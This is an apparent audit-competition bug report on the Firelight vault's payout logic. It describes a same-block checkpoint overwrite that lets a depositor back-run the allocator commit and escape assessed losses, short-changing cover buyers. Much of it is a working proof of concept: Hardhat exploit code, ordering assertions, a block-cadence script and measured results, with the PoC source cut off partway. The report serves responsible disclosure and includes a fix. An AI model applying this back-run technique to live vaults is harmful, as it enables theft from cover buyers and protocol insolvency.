# 89588 sc high same block checkpoint overwrite in firelightvault payout lets any depositor escape assessed loss exposure leaving the protocol unable to honour cover it already sold

**Submitted on Aug 20th 2026 at 01:33:18 UTC by @Pwning for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89588
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

`FirelightVault.payout` caps every incident payout at `min(assetsAtCapturePeriod, activePayableAmount)`, where `assetsAtCapturePeriod` is `totalAssetsAt(capturePeriodStart)` — the head of a `Checkpoints.Trace256`. Because `Trace256.push` **overwrites on an equal key instead of appending**, a permissionless `withdraw` mined in the block whose `block.timestamp` equals the period start rewrites the exact snapshot that the allocator already consumed when it sized the period's sellable cover, and that the payout will later read as its cap. The protocol therefore sells cover against capital it then treats as absent: in the measured run a fully-assessed claim of 900,000,000,000 asset units is paid only 200,000,000,000, the cover buyer is short 700,000,000,000 (700,000 USDC), and 560,000,000,000 (560,000 USDC) of that shortfall is retained by the withdrawing depositor who was contractually exposed to it. No privileged role acts and no role misbehaves — the attacker is an ordinary LP calling a permissionless function.

## Vulnerability Details

### The two operands, and why one defeats the other

`FirelightVault.payout` computes the payable amount at [`FirelightVault.sol:927`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L927):

```solidity
// FirelightVault.sol:909-927
// Cap by the active assets committed at the start of the covered period.
// This is an exposure cap, not a segregated asset bucket.
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();

// Withdrawals requested during the capture period are assigned to capturePeriod + 1
// and remain payable while payout is allowed.
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];

// If payout happens in the following period, withdrawals requested before payout
// during that following period are assigned to capturePeriod + 2 and should also
// remain payable; otherwise exposed assets could escape by withdrawing first.
uint256 nextPeriodWithdrawals;
if (_currentPeriod == capturePeriod + 1) {
    nextPeriodWithdrawals = withdrawAssets[capturePeriod + 2];
}

uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

`activePayableAmount` is a **deliberate anti-escape invariant**. It adds pending withdrawals back into the payable base, and the vault's own comment at [`FirelightVault.sol:918-920`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L918-L920) states the purpose verbatim:

> *"…withdrawals requested before payout during that following period are assigned to capturePeriod + 2 and should also remain payable; **otherwise exposed assets could escape by withdrawing first**."*

That invariant is correctly implemented and it works. The sibling operand voids it.

### Why `assetsAtCapturePeriod` is mutable

`totalAssetsAt` reads a checkpoint trace. [`Checkpoints.sol:207-208`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/lib/Checkpoints.sol#L207-L208) overwrites rather than appends when the pushed key equals the latest key:

```solidity
// Checkpoints.sol:203-212
(bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();

uint256 len = self._values.length;
uint256 lastValue = latest(self);
if (exists && key == lastKey) {
    self._values[len - 1] = value;      // <-- OVERWRITE, not append
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

The key is `block.timestamp`. Every vault balance mutation routes through `_logTrace` at [`FirelightVault.sol:1044-1056`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1044-L1056):

```solidity
function _logTrace(
    address owner,
    uint256 balance,
    uint256 _totalSupply,
    uint256 _totalAssets,
    bool isLogAssets
) private {
    uint48 ts = Time.timestamp();
    _traceBalanceOf[owner].push(ts, balance);
    _traceTotalSupply.push(ts, _totalSupply);

    if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
}
```

So a `withdraw` landing in a block whose `block.timestamp == periodStart` **replaces** `totalAssetsAt(periodStart)` rather than adding a new point after it.

### The same key is also what sizes the cover

[`CoverOrderAllocator.sol:711`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L711), inside `_computeAvailableCapacity`, reads the identical key:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

Its own doc comment at [`CoverOrderAllocator.sol:690`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L690) shows the intended reading — a value fixed for the period:

> *"Values staked assets at `currentPeriodStart()`, so it is only meaningful for the current period (enforced by callers)."*

Two contracts read one storage key at two different times and both assume it is immutable for the period. It is not.

### The contradiction inside the vault itself

The vault classifies a single transaction two ways at once. `_requestWithdraw` buckets the withdrawal into `withdrawAssets[currentPeriod() + 1]`, treating it as belonging to the **new** period — which is exactly what keeps it inside `activePayableAmount` and therefore payable. Simultaneously, `totalAssetsAt(periodStart)` folds that same withdrawal into the snapshot taken **before** that period began, which is what caps the payment.

The withdrawal is counted as *still exposed* by one operand and as *already gone* by the other, and `Math.min` lets the second one win.

### Measured, both operands, immediately before payout

The PoC reads both operands directly from the live contracts one call before `payout` executes:

|                                         | control           | treatment         |
| --------------------------------------- | ----------------- | ----------------- |
| `totalAssets()`                         | 200000000000      | 200000000000      |
| `withdrawAssets[capturePeriod+1]`       | 800000000000      | 800000000000      |
| **`activePayableAmount`** (operand A)   | **1000000000000** | **1000000000000** |
| **`assetsAtCapturePeriod`** (operand B) | **1000000000000** | **200000000000**  |
| resulting `paidAmount`                  | 900000000000      | 200000000000      |

```
control:    paidAmount = min(900000000000, min(1000000000000, 1000000000000)) = 900000000000
treatment:  paidAmount = min(900000000000, min( 200000000000, 1000000000000)) = 200000000000
                                                ^^^^^^^^^^^^^
                                                the only value that differs
```

`activePayableAmount` is **identical in both arms**, and so are the vault's liquid `totalAssets()` and the withdrawal bucket. The claim is therefore **not** truncated because the assets are absent — they are present and payable, and the anti-escape mechanism correctly says so. It is truncated solely because the sibling operand was rewritten. This is what makes the finding a constraint bypass rather than a capacity shortfall, and it is why the vault's stated intent for that operand — *"the active assets committed at the start of the covered period"* ([`:909-910`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L909-L910)) — is false at the moment it is read. The assets committed at the start of that period were 1,000,000,000,000.

### Control validity

The two arms differ in exactly one variable. Measured and emitted by both:

|                                             | treatment    | control      |
| ------------------------------------------- | ------------ | ------------ |
| `withdrawAssets[targetPeriod+1]`            | 800000000000 | 800000000000 |
| `currentPeriod()` at withdrawal             | 2            | 2            |
| target period                               | 2            | 2            |
| **offset of withdrawal from `periodStart`** | **0 s**      | **1 s**      |

Identical bucket, identical period, identical amount. The single difference between a full payout and a 700,000 USDC shortfall is a one-second difference in the withdrawal's block timestamp.

### Reachability — three preconditions, each measured

**1. A block must exist whose timestamp is exactly `periodStart`.** Stated plainly because the PoC forces it with `evm_setNextBlockTimestamp`: a write one second either side of `periodStart` creates a new checkpoint and changes nothing. Measured against Flare mainnet, two independent 300-block samples taken minutes apart:

```
                          sample 1      sample 2
blocks sampled                 300           300
wall-clock span (s)            339           333
mean gap (s)                 1.134         1.114
gap histogram          {1:280,2:12,  {1:282,2:11,
                              5:7}     4:1,5:5}
distinct timestamps            300           300
seconds carrying a block     88.2%         89.8%
```

Roughly **88–90% of any given second on Flare carries a block bearing exactly that timestamp**, so the boundary block is the ordinary case, not a lucky one. Every sampled block had a distinct timestamp, so when it exists it is unique.

**2. The allocator's commit must land in that same block.** The commit reads `currentPeriodStart()` — a computed timestamp, not a block property — and the project's own [`MockCoverOrderAllocatorVault.sol:38-40`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/test/MockCoverOrderAllocatorVault.sol#L38-L40) documents the operating mode:

> *"Mirror FirelightVault semantics for the off-chain matcher: the current period started the moment it rolled. The off-chain engine pins its matching reads to the first block at/after this timestamp."*

If the commit instead landed in a *later* block, any write at key `periodStart` would necessarily precede it, so the commit would read the already-reduced value and size cover correctly.

**That dependency is itself the defect, not a mitigation of it.** Nothing in `CoverOrderAllocator` or `FirelightVault` constrains when the commit is submitted. The contracts read a **mutable** checkpoint as though it were **immutable** for the period, and whether that assumption holds is decided entirely by off-chain submission timing the contracts neither observe nor enforce. A safety property — that cover is never sold against capital which has already left — must not rest on the punctuality of an off-chain engine. This report therefore does not require the reviewer to accept any claim about how the production matcher behaves today: if it commits in the boundary block the loss is reachable now, and if it does not, the contracts still carry a latent unsafe assumption that any future change in engine latency, block cadence, or a retry path converts into the loss below, with no contract change and no warning.

**3. The withdrawal must be ordered after the commit within that block.** This is a genuine transaction-ordering requirement and is not glossed. The PoC **asserts** it rather than assuming it — it checks the withdrawal shares the commit's block number and carries a strictly higher transaction index, with the commit paying 100 gwei priority and the attacker 1 gwei. Being ordered *after* a known transaction is the easy direction: this is a back-run, not a front-run. The period start is deterministic (`epoch + n * duration`), so the attacker does not need to observe the commit — they pre-submit a low-priority withdrawal targeted at that block, and a miss costs nothing beyond an ordinary withdrawal.

## Impact Details

### Selected in-scope impact: Protocol insolvency

The protocol sells 900,000,000,000 asset units of cover, an incident assesses the full amount, and the contract honours 200,000,000,000. It cannot meet an obligation it has already sold, while the capital that backed it leaves to the LPs. Equivalently, *direct theft of any user funds, whether at-rest or in-motion*: the claimant's payment is funds in motion, 700,000,000,000 of it never arrives, and 560,000,000,000 is retained by the attacker.

### The loss, measured

Scenario: a 1,000,000-token vault (6-decimal asset), cover sold at 90% of it, attacker holding 80% of deposits.

|                                              | control                  | treatment                | delta             |
| -------------------------------------------- | ------------------------ | ------------------------ | ----------------- |
| capacity committed                           | 900000000000000000000000 | 900000000000000000000000 | 0                 |
| `totalAssetsAt(periodStart)` after the block | 1000000000000            | 200000000000             | rewritten         |
| claim assessed                               | 900000000000             | 900000000000             | 0                 |
| claim **paid**                               | 900000000000             | 200000000000             | **−700000000000** |
| attacker's assets recovered                  | 80000000000              | 640000000000             | +560000000000     |

### The attacker's position, stated precisely

The attacker does **not** end up with more than they deposited. They deposit 800,000,000,000 and recover 640,000,000,000, so in absolute terms they are down 160,000,000,000. What they gain is escape from a loss they were contractually exposed to. Had the claim paid in full — the control's outcome, and the design's intent — their pro-rata share of the assessed loss would have left them with 80,000,000,000:

```
loss they would have borne, claim paid in full   720,000,000,000
loss actually borne                              160,000,000,000
                                                ────────────────
loss ESCAPED by the attacker                     560,000,000,000   (560,000 USDC)
loss escaped by the other LPs                    140,000,000,000
                                                ────────────────
shortfall borne by the cover buyer               700,000,000,000   ✓ closes exactly
```

The 560,000,000,000 figure is corroborated two independent ways: as the cross-arm difference in the attacker's recovered assets (640B − 80B), and as the within-arm escaped-loss identity above. Both are emitted by the PoC, and the control emits `0` for all three.

The loss scales with the attacker's LP share and with the size of the assessed incident.

### Why the operator recovery path does not cap this

The exposure cap is per call rather than aggregate — the program's published known issue \[3] — so operators *can* recover the buyer by opening further incidents against the same order. That path was executed and it does work. It is nonetheless not a mitigation that caps severity, for three measured reasons.

**1. It is not the code's behaviour; it is discretionary human work the protocol never signals.** `payout` truncates silently via `min()`. It does not revert, the incident is set CLOSED after the partial payout, and no path reopens it. Nothing in the contracts tells an operator that the snapshot was rewritten or that the buyer is short.

**2. It requires the CURATOR to fabricate incidents that did not occur**, purely as a payment rail — 4 extra incident cycles at the measured 80% share, up to 17 at 95%, each cycle five transactions needing both CURATOR and ASSESSMENT\_APPROVER. Manufacturing loss events that never happened is not a documented privilege of that role, so this is not an operator using the system as designed.

**3. The window is hard-bounded and shuts at exactly the moment the attacker can take the money.** `_isPeriodInPayoutWindow` is `current == period || current == period + 1`, so payout is impossible from `capturePeriod + 2` onward. `claimWithdraw` requires `period < currentPeriod()` and the withdrawal sits in `capturePeriod + 1`, so the attacker's first opportunity to claim is `currentPeriod() == capturePeriod + 2`. Recovery ends and extraction begins in the same period. With the on-chain period duration of 86400 seconds, operators have at most two days, unprompted.

Operator recovery cost against the size of the boundary withdrawal, measured:

| attacker's share | snapshot after | first payout | recovered    | extra incident cycles |
| ---------------- | -------------- | ------------ | ------------ | --------------------- |
| 50%              | 500000000000   | 500000000000 | 400000000000 | 1                     |
| 80%              | 200000000000   | 200000000000 | 700000000000 | 4                     |
| 90%              | 100000000000   | 100000000000 | 800000000000 | 8                     |
| 95%              | 50000000000    | 50000000000  | 850000000000 | 17                    |

If that work is not done in time, the cover buyer's shortfall is permanent and the escaped loss stays escaped. No operator has to do anything wrong for this — they simply have to not perform an undocumented remediation that nothing told them was needed.

**Fallback framing:** if the reviewer credits the recovery path, the honest fallback impact is *temporary freezing of funds for at least 24 hours*, since the payout window is two periods and the on-chain period duration is 86400 seconds.

### Live-chain context

Measured today against Flare mainnet via `test/fork/v2_upgrade_mainnet.js` (4 passing):

```
live totalAssets                          56601413625750   (56,601,413.63 FXRP)
live pendingWithdrawAssets                  215799508170
live periodDuration                                86400   (1 day)
totalAssetsAt(currentPeriodStart)         56601413625751
```

The live `FirelightVault` proxy's `_traceTotalAssets` history is dense and populated, so `totalAssetsAt` returns real values in production and the period duration bounding the recovery window is the deployed one rather than a test constant. `IncidentManager` and `CoverOrderAllocator` are not yet deployed on Flare — the expected state of code under a pre-deployment audit. This finding is against the audited branch `v1_audit_ready` at commit `42f9ea5`; the live figures are corroboration that the checkpoint history the exploit manipulates is real, not a contingency for the finding.

### Suggested fix

Read the exposure snapshot at `periodStart - 1`, or push a period-start checkpoint on the first write of each period. Either makes the value immune to a later write on the same timestamp key and restores the invariant `activePayableAmount` already encodes.

A narrower alternative: drop `assetsAtCapturePeriod` from the `min()` when the withdrawal it accounts for is still inside `activePayableAmount`, since in that case the two operands double-count the same assets in opposite directions.

### Note on scope

This is **not** a duplicate of known issue \[3]. That issue concerns aggregate claims exceeding cover sold. This is the opposite direction — cover sold exceeding the claims the contract will pay — and known issue \[3] is what makes the operator recovery path possible at all, not what causes the bug.

## References

Target: <https://github.com/immunefi-team/audit-comp-firelight> Branch `v1_audit_ready`, commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62`.

* [`FirelightVault.sol:927`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L927) — the `min()` whose anti-escape operand is defeated
* [`FirelightVault.sol:911`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L911) — `assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart)`
* [`FirelightVault.sol:909-910`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L909-L910) — the comment stating the operand's intended meaning
* [`FirelightVault.sol:918-920`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L918-L920) — the comment stating the invariant being broken
* [`FirelightVault.sol:1044-1056`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1044-L1056) — `_logTrace`, keying the checkpoint on `block.timestamp`
* [`FirelightVault.sol:1130-1132`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1130-L1132) — `_isPeriodInPayoutWindow`
* [`FirelightVault.sol:788-790`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L788-L790) — `claimWithdraw` period gate
* [`CoverOrderAllocator.sol:711`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L711) — sizes the period's cover from the same key
* [`CoverOrderAllocator.sol:690`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L690) — doc comment asserting the value is fixed for the period
* [`Checkpoints.sol:207-208`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/lib/Checkpoints.sol#L207-L208) — overwrites, rather than appends, on an equal key
* [`MockCoverOrderAllocatorVault.sol:38-40`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/test/MockCoverOrderAllocatorVault.sol#L38-L40) — the project's own statement of the commit-at-period-roll operating mode

## Proof of Concept

## Proof of Concept

### Environment

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight
cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62   # branch v1_audit_ready
npm install
```

Save the file in *Full PoC source* below as `test/integration/k_ts1_backrun.js`. **No in-scope contract is modified** — verified with `git diff --stat HEAD -- contracts/core contracts/oracle`, which is empty. The only mocked contracts are the vault's asset token (`MockERC20`) and the price feed (`MockAggregatorV3`); the vault, allocator, `IncidentManager` and `CoverNFT` are all real. Neither mock lies on the path this finding concerns.

### Step-by-step

Both arms execute the identical sequence. The **only** difference is the boolean `sameBlock`, which decides which block the whale's `withdraw` is mined in.

1. **Seed the vault.** Two depositors fund a 1,000,000-token vault: the attacker ("whale") deposits 800,000,000,000 (80%) and a passive LP deposits 200,000,000,000 (20%).
2. **Advance to period P-1 and write a cover order.** The CURATOR calls `createCoverOrder` for 900,000 canonical USD of cover against market `Morpho/market-A`. The order's `period` is asserted to equal `pPrev + 1` — it targets period P.
3. **Read the period boundary.** `periodStart = vault.currentPeriodEnd()`, which is the first timestamp of period P.
4. **Build the boundary block.** Disable automine and pin the next block's timestamp to exactly `periodStart`:

   ```js
   await ethers.provider.send('evm_setAutomine', [false])
   await ethers.provider.send('evm_setNextBlockTimestamp', [Number(periodStart)])
   ```
5. **Submit the allocator's commit first.** `commitAllocation(targetPeriod, root, coverAmount, coverAmount)` at 100 gwei priority fee. Internally this reads `totalAssetsAt(currentPeriodStart())` = **1,000,000,000,000** and commits that as the period's available capacity.
6. **Back-run it with the withdrawal — treatment only.** `withdraw(WHALE, whale, whale)` at 1 gwei priority fee, so the mempool orders it *after* the commit. `_requestWithdraw` calls `_logTrace`, which pushes a checkpoint keyed `block.timestamp == periodStart`. Because `Trace256.push` overwrites on an equal key, `totalAssetsAt(periodStart)` is **rewritten from 1,000,000,000,000 down to 200,000,000,000**. In the control this same withdrawal is instead mined in the next block (`periodStart + 1`), where it appends a new checkpoint and leaves the period-start value intact.
7. **Mine the block and assert the ordering — not assume it.**

   ```js
   expect(commit block timestamp).to.equal(periodStart)
   expect(vault.currentPeriod()).to.equal(targetPeriod)
   // treatment:
   expect(wdRcpt.blockNumber).to.equal(commitRcpt.blockNumber)   // same block
   expect(wdRcpt.index > commitRcpt.index).to.equal(true)        // ordered AFTER
   // control:
   expect(wdRcpt.blockNumber > commitRcpt.blockNumber).to.equal(true)
   ```
8. **Capture control-validity evidence.** Read `withdrawAssets[targetPeriod+1]`, `currentPeriod()`, and the withdrawal block's timestamp offset from `periodStart`. These come out **identical in both arms** except the offset (0 s vs 1 s).
9. **Settle the cover order.** `settleCoverOrder(orderId, allocations, [])` succeeds against the capacity committed in step 5, at the **full** 900,000 canonical USD in both arms. The protocol has now sold cover against capital that, in the treatment, the vault's own snapshot says has left.
10. **Open and assess an incident in period P** at the full settled cover amount: `createIncident(periodStart, …)` → `confirmIncident` → `addAssessmentLosses(amount = settled.allocatedCoverAmount)` → `submitCurrentAssessment`.
11. **Read both `min()` operands immediately before payout.**

    ```js
    const activeAssetsPre            = await vault.totalAssets()                       // 200000000000 BOTH arms
    const capturePeriodWithdrawalsPre= await vault.withdrawAssets(targetPeriod + 1n)   // 800000000000 BOTH arms
    const activePayablePre           = activeAssetsPre + capturePeriodWithdrawalsPre   // 1000000000000 BOTH arms
    const assetsAtCapturePre         = await vault.totalAssetsAt(periodStart)          // 1000000000000 vs 200000000000
    ```
12. **Approve the assessment, triggering the payout.** `approveCurrentAssessment(incidentId)` drives `FirelightVault.payout`. Measure the delta in the payout receiver's balance.
    * **Control:** paid **900,000,000,000** — the full assessed claim.
    * **Treatment:** paid **200,000,000,000** — short by **700,000,000,000**.
13. **Run the operator recovery arm (optional, `K_TS1_WORKAROUND=1`).** Loop opening further incidents against the same order while `isPeriodInPayoutWindow(targetPeriod)` holds, to test honestly whether operators can recover the buyer. They can — in 4 cycles at the 80% share — which is why the report addresses that path explicitly rather than hiding it.
14. **Advance two periods and let the attacker exit.** `claimWithdraw(targetPeriod + 1)`.
    * **Control:** attacker recovers **80,000,000,000** — they bore their full pro-rata share of the loss.
    * **Treatment (no operator recovery):** attacker recovers **640,000,000,000** — they escaped **560,000,000,000** of it.

### Commands and observed output

```bash
K_TS1_ARM=control    npx hardhat test test/integration/k_ts1_backrun.js
```

```
h13_capacity_committed: 900000000000000000000000
h13_snapshot_after: 1000000000000
h13_claim_assessed: 900000000000
h13_claim_paid: 900000000000
h13_shortfall: 0
h13_shortfall_usdc: 0
h13_vault_total_usdc: 1000000
h13_whale_recovered: 80000000000
h13_withdraw_bucket: 800000000000
h13_active_assets_pre: 200000000000
h13_active_payable_pre: 1000000000000
h13_assets_at_capture_pre: 1000000000000
h13_withdraw_period: 2
h13_target_period: 2
h13_wd_offset_from_period_start: 1
h13_attacker_share_pct: 80
h13_other_lps_share_pct: 20
h13_attacker_loss_if_paid_in_full: 720000000000
h13_attacker_loss_actual: 720000000000
h13_attacker_escaped_loss: 0
h13_attacker_escaped_loss_usdc: 0
h13_other_lps_escaped_loss: 0
  2 passing
```

```bash
K_TS1_ARM=treatment  npx hardhat test test/integration/k_ts1_backrun.js
```

```
h13_capacity_committed: 900000000000000000000000
h13_snapshot_after: 200000000000
h13_claim_assessed: 900000000000
h13_claim_paid: 200000000000
h13_shortfall: 700000000000
h13_shortfall_usdc: 700000
h13_vault_total_usdc: 1000000
h13_whale_recovered: 640000000000
h13_withdraw_bucket: 800000000000
h13_active_assets_pre: 200000000000
h13_active_payable_pre: 1000000000000
h13_assets_at_capture_pre: 200000000000
h13_withdraw_period: 2
h13_target_period: 2
h13_wd_offset_from_period_start: 0
h13_attacker_share_pct: 80
h13_other_lps_share_pct: 20
h13_attacker_loss_if_paid_in_full: 720000000000
h13_attacker_loss_actual: 160000000000
h13_attacker_escaped_loss: 560000000000
h13_attacker_escaped_loss_usdc: 560000
h13_other_lps_escaped_loss: 140000000000
  2 passing
```

Operator recovery arm (**both** environment variables are required — the loop's default round cap of 12 truncates the 95% row and prints a shortfall that is an artifact of the harness, not a property of the protocol):

```bash
K_TS1_WORKAROUND=1 K_TS1_MAX_ROUNDS=30 npx hardhat test test/integration/k_ts1_backrun.js
```

```
CONTROL   — whale withdraws one block later
  capacity committed (read at periodStart) : 900000000000000000000000
  snapshot totalAssetsAt(periodStart) after: 1000000000000
  cover sold                               : 900000000000000000000000
  claim assessed (asset units)             : 900000000000
  claim PAID     (asset units)             : 900000000000
  recovered by extra incidents (workaround): 0 over 0 rounds
  whale deposited / recovered              : 800000000000 / 80000000000
TREATMENT — whale back-runs the commit in the boundary block
  capacity committed (read at periodStart) : 900000000000000000000000
  snapshot totalAssetsAt(periodStart) after: 200000000000
  cover sold                               : 900000000000000000000000
  claim assessed (asset units)             : 900000000000
  claim PAID     (asset units)             : 200000000000
  recovered by extra incidents (workaround): 700000000000 over 4 rounds
  whale deposited / recovered              : 800000000000 / 80000000000
SHORTFALL to the claimant, treatment: 700000000000 asset units
SHORTFALL to the claimant, control  : 0

whale% | snapshot after | first payout |  recovered  | extra incidents needed
    50% |   500000000000 | 500000000000 | 400000000000 | 1
    80% |   200000000000 | 200000000000 | 700000000000 | 4
    90% |   100000000000 | 100000000000 | 800000000000 | 8
    95% |    50000000000 |  50000000000 | 850000000000 | 17
  2 passing
```

### Supporting measurement 1 — Flare block cadence (reachability precondition #1)

```js
const RPC = 'https://flare-api.flare.network/ext/C/rpc'
const N = 300
const call = async (m, p) => {
  const r = await fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }) })
  return (await r.json()).result
}
;(async () => {
  const latest = parseInt(await call('eth_blockNumber', []), 16)
  const ts = []
  for (let i = 0; i < N; i++) {
    const b = await call('eth_getBlockByNumber', ['0x' + (latest - i).toString(16), false])
    ts.push(parseInt(b.timestamp, 16))
  }
  ts.reverse()
  const gaps = []
  for (let i = 1; i < ts.length; i++) gaps.push(ts[i] - ts[i - 1])
  const span = ts[ts.length - 1] - ts[0]
  const distinct = new Set(ts).size
  const hist = {}
  gaps.forEach(g => (hist[g] = (hist[g] || 0) + 1))
  console.log('blocks sampled              :', N)
  console.log('wall-clock span (s)         :', span)
  console.log('distinct timestamps         :', distinct)
  console.log('mean gap (s)                :', (span / (N - 1)).toFixed(3))
  console.log('gap histogram               :', JSON.stringify(hist))
  console.log('seconds carrying a block (%):', ((distinct / (span + 1)) * 100).toFixed(1))
})()
```

Two runs minutes apart:

```
run 1: blocks 300  span 339  distinct 300  mean 1.134  hist {"1":280,"2":12,"5":7}          => 88.2%
run 2: blocks 300  span 333  distinct 300  mean 1.114  hist {"1":282,"2":11,"4":1,"5":5}    => 89.8%
```

### Supporting measurement 2 — live Flare state

```bash
FORK=1 NODE_RPC_URL=https://flare-api.flare.network/ext/C/rpc \
  npx hardhat test test/fork/v2_upgrade_mainnet.js
```

```
live totalAssets      56601413625750 (56601413.62575 FXRP)
live pendingWithdraw  215799508170
live periodDuration   86400
exposure cap totalAssetsAt(periodStart) = 56601413625751
  4 passing
```

### Full PoC source — `test/integration/k_ts1_backrun.js`

```javascript
/**
 * K-TS-1, exploit arm — same-block back-run of the period-start snapshot.
 *
 * `CoverOrderAllocator._computeAvailableCapacity` sizes a period's sellable cover from
 *     vault.totalAssetsAt(vault.currentPeriodStart())
 * and `FirelightVault.payout` caps what that period's incidents can be paid with
 *     totalAssetsAt(capturePeriodStart)
 * — the SAME storage key, read at two different times. `Checkpoints.Trace256.push`
 * overwrites on an equal key, so any checkpoint write while
 * `block.timestamp == periodStart` rewrites the value the earlier read used.
 *
 * TREATMENT: `commitAllocation` and a whale `withdraw` land in the SAME block, at
 *            timestamp == periodStart, commit ordered first.
 * CONTROL:   byte-identical, except the whale's withdraw is mined in the NEXT block.
 *
 * Both arms run the real vault, the real allocator, the real IncidentManager and the
 * real CoverNFT. Nothing about the vulnerable component is mocked.
 */
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault, computeMarketId, computeProtocolConcentrationHash } = require('../setup/fixtures.js')
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')

const DEC = 6
const ONE = 10n ** BigInt(DEC)
const PERIOD = 86400
const CANON = 18
const ONE_CANON = 10n ** BigInt(CANON)

const PROTOCOL = 'Morpho'
const MARKET = ethers.encodeBytes32String('market-A')

const randomSigner = async () => {
  const w = ethers.Wallet.createRandom().connect(ethers.provider)
  await ethers.provider.send('hardhat_setBalance', [w.address, '0x3635C9ADC5DEA00000'])
  return w
}

const leafFor = (orderId, allocations) =>
  ethers.keccak256(ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
    ['uint256', 'tuple(bytes32 marketId,uint256 allocatedCover)[]'], [orderId, allocations])))

async function stack() {
  const ctx = await loadFixture(deployVault.bind(null, {
    decimals: DEC,
    initial_deposit_limit: (10_000_000n * ONE).toString(),
    period_configuration_duration: PERIOD,
  }))
  const { firelight_vault: vault, deployer } = ctx

  const [admin, curator, allocatorRole, configAdmin, adminRole, approver, rejecter,
    invalidator, payoutAdmin, premiumCollector, flbWallet, payoutRecipient, payoutReceiver, buyer] =
    await Promise.all(Array.from({ length: 14 }, randomSigner))

  const usdc = await (await ethers.getContractFactory('MockERC20')).connect(deployer).deploy('mUSDC', 'mUSDC', 6)
  const priceFeed = await (await ethers.getContractFactory('MockAggregatorV3')).connect(deployer).deploy(18, ONE_CANON)

  const coverNFT = await upgrades.deployProxy(await ethers.getContractFactory('CoverNFT'),
    ['Firelight Cover', 'FLCOVER', '', admin.address, ethers.ZeroAddress, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: 'transparent' })

  const allocator = await upgrades.deployProxy(await ethers.getContractFactory('CoverOrderAllocator'), [{
    vault: await vault.getAddress(),
    premiumCollector: premiumCollector.address,
    coverNFT: await coverNFT.getAddress(),
    priceFeedAdapter: await priceFeed.getAddress(),
    maxPriceAge: 7 * 24 * 3600,
    premiumTokens: [await usdc.getAddress()],
    admin: admin.address, adminRole: adminRole.address, curatorRole: curator.address,
    allocatorRole: allocatorRole.address, configAdminRole: configAdmin.address,
    initialProtocolConcentrations: [{ protocol: PROTOCOL, chainId: 1, maxProtocolConcentrationBps: 10000 }],
    newMarkets: [{ chainId: 1, protocol: PROTOCOL, market: MARKET }],
    capacityConfig: {
      minCAR: 12000, firstLossBufferToken: await usdc.getAddress(), firstLossBuffer: flbWallet.address,
      effectiveLeverage: 12000, minOrderMarketCoverAmount: 1, divergenceToleranceBps: 0,
    },
  }], { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] })
  await coverNFT.connect(admin).grantRole(ethers.id('MINTER_ROLE'), await allocator.getAddress())

  const im = await upgrades.deployProxy(await ethers.getContractFactory('IncidentManager'), [
    admin.address, curator.address, approver.address, rejecter.address, invalidator.address,
    configAdmin.address, payoutAdmin.address, admin.address, payoutReceiver.address,
    await allocator.getAddress(), await priceFeed.getAddress(), 7 * 24 * 3600,
  ], { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] })

